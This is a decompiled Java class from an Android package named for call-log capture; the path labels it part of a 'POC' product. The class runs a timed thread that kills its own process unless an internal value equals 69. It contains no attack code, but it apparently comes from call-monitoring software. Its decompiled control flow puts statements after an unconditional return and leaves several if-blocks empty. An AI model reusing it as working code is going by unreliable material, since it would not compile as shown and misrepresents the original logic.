package com.vvt.capture.calllog;

import android.os.Process;
import android.os.SystemClock;

class c
  extends Thread
{
  c(b paramb) {}
  
  public void run()
  {
    long l = 60000L;
    SystemClock.sleep(l);
    Object localObject = b.a(this.a);
    if (localObject == null)
    {
      boolean bool1 = b.c();
      if (bool1) {}
      int i = Process.myPid();
      Process.killProcess(i);
    }
    for (;;)
    {
      return;
      localObject = b.a(this.a);
      boolean bool2 = localObject instanceof Integer;
      int j;
      if (!bool2)
      {
        bool2 = b.c();
        if (bool2) {}
        j = Process.myPid();
        Process.killProcess(j);
      }
      else
      {
        localObject = (Integer)b.a(this.a);
        j = ((Integer)localObject).intValue();
        int m = 69;
        if (j != m)
        {
          boolean bool3 = b.c();
          if (bool3) {}
          int k = Process.myPid();
          Process.killProcess(k);
        }
      }
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/calllog/MyUncaughtExceptionHandler.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */